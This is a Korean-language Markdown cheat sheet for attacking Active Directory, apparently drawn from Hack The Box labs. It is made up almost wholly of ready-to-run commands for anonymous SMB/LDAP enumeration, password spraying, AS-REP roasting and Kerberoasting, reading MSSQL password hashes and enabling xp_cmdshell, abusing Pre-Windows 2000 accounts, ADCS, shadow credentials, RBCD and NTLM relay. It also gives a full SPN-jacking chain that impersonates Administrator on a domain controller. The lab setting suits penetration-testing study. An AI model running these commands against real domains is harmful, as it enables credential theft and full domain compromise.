# 0. Start
## 0.1. 마인드맵
- https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap_ad_dark_classic_2025.03.excalidraw.svg
- https://kypvas.github.io/ad_attack_architecture/
- https://x.com/_nwodtuhs/
## 0.2. "KRB_AP_ERR_SKEW(Clock skew too great)" 오류 해결
### rdate
```
sudo rate -n <IP>
```
### faketime
```
faketime "$(ntpdate -q <IP> | cut -d ' ' -f 1,2)" <명령어>


### 아니면 차이 나는 시간을 가지고 faketime 시간을 지정할 수도 있다.
## Step 1. DC 현재 시간 확인
ntpdate -q <IP>

## Stpe 2. 시간차를 보정하여 명령어 실행
faketime -f +7h <명령어>
```
## 0.3. kali 내 exe 파일 설치
### chisel
```
## Step 1. 설치
sudo apt install chisel-common-binaries

## Step 2. 위치 확인
chisel-common-binaries -h
```
### Rubeus
```
## Step 1. 설치
sudo apt install rubeus

## Step 2. 위치 확인
rubeus -h
```
### winPEAS
```
## Step 1. 설치
sudo apt install peass

## Step 2. 위치 확인
peass -h
```
### 그 외 바이너리
- 경로 : /usr/share/windows-binaries

# 1. 초기 접근
## 1.1. SMB
### null session
```
### 🔨 nxc
nxc smb <IP> -u '' -p ''
```
### anonymous session
```
### 🔨 nxc
nxc smb <IP> -u 'asdf' -p ''
```
### 유효한 계정 정보
```
### 🔨 nxc
nxc smb <IP> -u '<USERNAME>' -p '<PASSWORD>'
```
### 전체 파일 다운로드
```
### 🔨 nxc
nxc smb <IP> -u 'asdf' -p '' -M spider_plus -o DOWNLOAD_FLAG=True

### 🔨 smbclient
smbclient //<IP>/<share> -U 'a'
smb: \> mask ""
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```

## 1.2. LDAP
### null session
```
### 🔨 ldapsearch
ldapsearch -x -H ldap://<IP>:389 -b "<BASE_DN>" "<검색구문>" <가져올 필터>

## 예시
ldapsearch -x -H ldap://10.129.6.206:389 -b "dc=overwatch,dc=htb" "(|(objectClass=domain)(objectClass=organizationalUnit)(objectClass=groupPolicyContainer))" "sAMAccountName cn"


### 🔨 nxc
nxc ldap <IP> -u '<USERNAME>' -p '<PASSWORD>' --groups "<GROUP_NAME>"
nxc ldap <ip> -u '<USERNAME>' -p '<PASSWORD>' --query "<검색구문>" "<가져올 필터>"

## 예시
nxc ldap 10.129.6.206 -u pentest -p 'p3nt3st2025!&' --groups "Domain Admins"
```
### 유효한 계정 정보
```
### 🔨 ldapsearch
ldapsearch -x -H ldap://<IP>:389 -b "<BASE_DN>" -D "<USERNAME_DN>" -w "<PASSWORD>" "<검색구문>" [<가져올 필터>]
```
### 주요 검색 구문
```
## 전체 데이터 수집
ldapsearch -x -H ldap://<IP>:389 -b "<BASE_DN>" "(|(objectClass=domain)(objectClass=organizationalUnit)(objectClass=groupPolicyContainer))" [*, ntsecuritydescriptor]
ldapsearch -x -H ldap://<IP>:389 -b "<BASE_DN>" "(|(samAccountType=805306368)(samAccountType=805306369)(samAccountType=268435456))" [*,ntsecuritydescriptor] 

## GPO 정책 조회
ldapsearch -x -H ldap://<IP>:389 -b "<BASE_DN>" "(objectClass=groupPolicyContainer)" [displayname,gPCWQLFilter]

## Domain Admin 조회
ldapsearch -x -H ldap://<IP>:389 -b "<BASE_DN>" "(&(samAccountType=268435456)(samAccountName=Domain Admins))" [samaccountname]

## Unconstrained Delegation 조회
ldapsearch -x -H ldap://<IP>:389 -b "<BASE_DN>" "(&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))" [samaccountname]

## Constrained Delegation 조회
ldapsearch -x -H ldap://<IP>:389 -b "<BASE_DN>" "(&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*))" [samAccountName,msDS-AllowedToDelegateTo]

## RBCD 조회
ldapsearch -x -H ldap://<IP>:389 -b "<BASE_DN>" "(&(objectCategory=computer)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))" [samaccountname,msDS-AllowedToActOnBehalfOfOtherIdentity]
```
## 1.3. RPC
### null session
```
### 🔨 rpcclient
rpcclient -U "" -N <IP>
```
## 1.4. Winrm
### 원격 접근 권한 있는지 확인
```
### 🔨 nxc
nxc winrm <IP> -u '<USERNAME>' -p '<PASSWORD>'
```
## 1.5. MSSQL
### 유효한 계정 정보
```
### 🔨 impacket
### 기본 port(1433)일 경우 -port 옵션 제외
### DC 계정이 아닌, DB 계정으로 접근 시 뒤에 -windows-auth 옵션 제외
impacket-mssqlclient <DOMAIN>/<USERNAME>:'<PASSWORD>'@<IP> -port <PORT> -windows-auth
```
### 주요 쿼리
```
## 서버명 조회
SQL (OVERWATCH\sqlsvc guest@master)> SELECT @@SERVERNAME;

## 데이터베이스 명 조회
SQL (OVERWATCH\sqlsvc guest@master)> SELECT name FROM sys.databases;

## 테이블 명 조회
SQL (OVERWATCH\sqlsvc dbo@overwatch)> select name from sys.tables;

## 현재 사용자의 권한 조회
SQL (OVERWATCH\sqlsvc guest@master)> SELECT IS_SRVROLEMEMBER('sysadmin');
SQL (OVERWATCH\sqlsvc guest@master)> SELECT * FROM fn_my_permissions(NULL, 'SERVER');
SQL (OVERWATCH\sqlsvc guest@master)> SELECT * FROM fn_my_permissions(NULL, 'DATABASE');

## 서버 파일 읽기
SQL (OVERWATCH\sqlsvc guest@master)> EXEC master..xp_dirtree 'C:\', 1, 1;
SQL (OVERWATCH\sqlsvc guest@master)> SELECT * FROM OPENROWSET( BULK 'C:\Windows\System32\drivers\etc\hosts', SINGLE_CLOB) AS Contents;

## 로그인한 사용자 password, hash 읽기
SQL (OVERWATCH\sqlsvc guest@master)> SELECT name, password_hash FROM sys.sql_logins;
SQL (OVERWATCH\sqlsvc guest@master)> SELECT name, password FROM master.sys.syslogins;
```
### xp_cmdshell
```
## Step 1. xp_cmdshell 활성화 여부 확인
SQL (OVERWATCH\sqlsvc guest@master)> SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell'

## Step 2. xp_cmdshell 활성화
SQL (OVERWATCH\sqlsvc guest@master)> EXEC sp_configure 'xp_cmdshell', 1;
```
### LinkedServer
```
## LinkedServer 조회
SQL (OVERWATCH\sqlsvc guest@master)> EXEC sp_linkedservers;
SQL (OVERWATCH\sqlsvc guest@master)> enum_links

## LinkedServer에 쿼리
SQL (OVERWATCH\sqlsvc guest@master)> SELECT * FROM OPENQUERY(SQL07, 'SELECT @@version');
SQL (OVERWATCH\sqlsvc guest@master)> EXEC ('SELECT SYSTEM_USER') AT SQL07;
```


# 2. 정보 수집
## 2.1. 사용자 조회
```
### 🔨 nxc
nxc smb <IP> -u '<USERNAME>' -p '<PASSWORD>' --users-export users.txt

### 🔨 ldapserach
ldapsearch -x -H ldap://<IP>:389 -b "<BASE_DN>" -D "<USERNAME_DN>" -w "<PASSWORD>" "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "

### 🔨 impacket
impacket-GetADUsers <DOMAIN>/<USERNAME>:'<PASSWORD>' -dc-ip <IP> -all | cut -d ' ' -f 1 | sort -fuV
```
## 2.2. Bloodhound
### install
```
## 설치
wget https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloodhound-cli-linux-amd64.tar.gz
tar -xvzf bloodhound-cli-linux-amd64.tar.gz
./bloodhound-cli install

## container 활성화
./bloodhound-cli up

## container 재시작
./bloodhound-cli resetpwd

## bloodhound 업데이트
./bloodhound-cli update
```
### Ingestor
```
### 🔨 nxc
nxc ldap <IP> -u '<USERNAME>' -p '<PASSWORD>' --dns-server <IP> --bloodhound --collection All

### 🔨 bloodhound-python
bloodhound-python -u '<USERNAME>' -p '<PASSWORD>' -ns <IP> -d <DOMAIN> -c all --zip
```
## 2.3. 보안 솔루션 조회
```
### 🔨 nxc
nxc smb <IP> -u '<USERNAME>' -p '<PASSWORD>' -M enum_av
```

# 3. 추가 계정 확보
## 3.1. Password Spary
```
### 🔨 nxc
nxc smb <IP주소> -u users.txt -p <PASSWORD> | grep +
```
## 3.2. AS-REP Roasting
유효한 계정 정보가 없어도 가능 (사용자 리스트는 있어야 함)
```
### 🔨 nxc
nxc ldap <IP> -u '<USERNAME>' -p '<PASSWORD>' --asreproast users.txt

### 🔨 impacket
impacket-GetNPUsers <DOMAIN>/<USERNAME>:'<PASSWORD>' -dc-ip <IP> -request -usersfile users.txt
```
## 3.3. Kerberoasting
유효한 계정 정보가 있어야 가능
```
### 🔨 nxc
nxc ldap <IP> -u '<USERNAME>' -p '<PASSWORD>' --kerberoasting kerberoast.hashes

### 🔨 impacket
impacket-GetUserSPNs <DOMAIN>/<USERNAME>:'<PASSWORD>' -dc-ip <IP> -request
```
## 3.4. Pre-Windows 2000
Pre-Windows 2000 Compatible Access 라는 보안 그룹이 있을 경우, 해당 컴퓨터 계정의 패스워드는 계정 이름의 소문자와 동일하다.
```
## Step 1. Pre-Windows 2000 식별
nxc ldap <IP> -u '<USERNAME>' -p '<PASSWORD>' -M pre2k

## Step 2. Change Password
### SERVERDEMO$ 컴퓨터 계정의 암호는 serverdemo가 된다. 이를 통해 패스워드를 변경하자.
impacket-changepasswd <DOMAIN>/'<COMPUTER>'@<IP> -newpass 'gotRoot!2' -p rpc-samr
```

# 4. Exploit
## 4.1. ADCS
```
## Step 1. ADCS 환경인지 확인
nxc ldap <IP> -u '<USERNAME>' -p '<PASSWORD>' -M adcs

## Step 2. ADCS 취약점 스캔
certipy find -vulnerable -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -dc-ip <IP>

## Step 3. ADCS 취약점 exploit
https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation
```
## 4.2. SPN-Jacking
https://www.semperis.com/blog/spn-jacking-an-edge-case-in-writespn-abuse/
```
### 아래 명령어는 HTB의 pirate 를 예시로 작성
### 가정 1 : a.white_adm -- 제약 위임 --> WEB01
### 가정 2 : a.white_adm -> (WriteSPN) --> WEB01
### 가정 3 : a.white_adm -> (WriteSPN) --> DC01
## Step 1. WEB01의 SPN 확인
bloodyAD --host ${htb_ip} -d pirate.htb -u 'a.white_adm' -p 'gotRoot!2' get object 'WEB01$' --attr servicePrincipalName

## Step 2. SPN 속성 하나 삭제 (HTTP/WEB01.pirate.htb)
addspn -u 'pirate.htb\a.white_adm' -p 'gotRoot!2' -t 'WEB01$' -s 'HTTP/WEB01.pirate.htb' -r ${htb_ip}

## Step 3. DC01에 SPN 추가
addspn -u 'pirate.htb\a.white_adm' -p 'gotRoot!2' -t 'DC01$' -s 'HTTP/WEB01.pirate.htb' ${htb_ip}

## Step 4. SPN 속성 값으로 TGS 발급 + Service Name Substitution - DC SPN으로 변경
impacket-getST -dc-ip ${htb_ip} -spn 'http/WEB01.pirate.htb' -impersonate Administrator 'pirate.htb/a.white_adm:gotRoot!2' -altservice 'cifs/DC01.pirate.htb'

## Step 5. DC 접근
export KRB5CCNAME=Administrator@cifs_DC01.pirate.htb@PIRATE.HTB.ccache
impacket-wmiexec -k -no-pass 'DC01.pirate.htb'
```

# 99. Tool CheatSheet
## BloodyAD
https://adminions.ca/books/active-directory-enumeration-and-exploitation/page/bloodyad
```
## 설치
sudo apt install bloodyad

## 사용자 정보 조회 (ldap)
bloodyAD --host <IP> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object <TARGET_USERNAE>

## 사용자를 특정 그룹에 추가
bloodyAD --host <IP> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add groupMember <GROUP_NAME> <TARGET_USERNAME>

## 사용자 비밀번호 변경
bloodyAD --host <IP> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> set password <TARGET_USERNAME> <NEW_PASSWORD>

## GMSAPassword 읽기
bloodyAD --host <IP> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object <TARGET_USERNAME> --attr msDS-ManagedPassword

## Writable Attributes 조회
bloodyAD --host <IP> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> writable --detail

## Shadow Credentials
bloodyAD --host <IP> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add shadowCredentials <TARGET_USERNAME>

## WriteSPN
bloodyAD --host <IP> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> set object <TARGET_USERNAME> servicePrincipalName -v 'domain/meow'

## 삭제된 object 복원
bloodyAD --host <IP> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> -k set restore <TARGET_USERNAME>

## fake computer 생성
bloodyAD --host <IP> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add computer <COMPUTER_NAME> <COMPUTER_PASSWORD>

## Resource Based Constrained Delegation 추가
bloodyAD --host <IP> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add rbcd 'DELEGATE_TO$' 'DELEGATE_FROM$'
```
## impacket
```
## AS-REP Roasting
impacket-GetNPUsers <DOMAIN>/<USERNAME>:'<PASSWORD>' -dc-ip <IP> -request -usersfile users.txt

## Kerberoasting
impacket-GetUserSPNs <DOMAIN>/<USERNAME>:'<PASSWORD>' -dc-ip <IP> -request
impacket-GetUserSPNs <DOMAIN>/<USERNAME> -k -no-pass -dc-ip <IP> -request

## 내 패스워드 변경
impacket-changepasswd <DOMAIN>/<USERNAME>:'@<IP> -newpass '<NEW_PASSWORD>'

## 타 사용자 패스워드 변경
impacket-changepasswd <DOMAIN>/<TARGET_USERNAME>:'<PASSWORD>'@<IP> -newpass '<NEW_PASSWORD>' -altuser <USERNAME> -altpasswd -k -no-pass -reset

## TGS 발급
impacket-getST -spn '<SPN>' -dc-ip <IP> <DOMAIN>/<USERNAME>:'<PASSWORD>'

## .kirbi -> .ccache 변경
impacket-ticketConverter <kirbi_FIELNAME> <OUTPUT_FILENAME>

## S4U
impacket-getST -spn '<SPN>' -impersonate Administrator -dc-ip <IP> <DOMAIN>/<USERNAME>:'<PASSWORD>'

### 예시
impacket-getST -spn 'http/WEB01.pirate.htb' -impersonate Administrator -dc-ip ${htb_ip} 'pirate.htb/TCEXQYUI$:guUH_NpRfk<cY5i'

## S4U + Service Name Substitution
impacket-getST -spn '<SPN>' -impersonate Administrator -altservice '<ALT_SPN>' -dc-ip <IP> <DOMAIN>/<USERNAME>:'<PASSWORD>'

## Winrm 접근
impacket-wmiexec <DOMAIN>/<USERNAME>:'<PASSWORD>'@<IP>
impacket-wmiexec -k -no-pass <IP>

## ntlmrelay
impacket-ntlmrelayx -t ldap://<IP> -smb2support --remove-mic

## ntlmrelay + RBCD
impacket-ntlmrelayx -t ldap://<IP> -smb2support --remove-mic --delegate-access
```
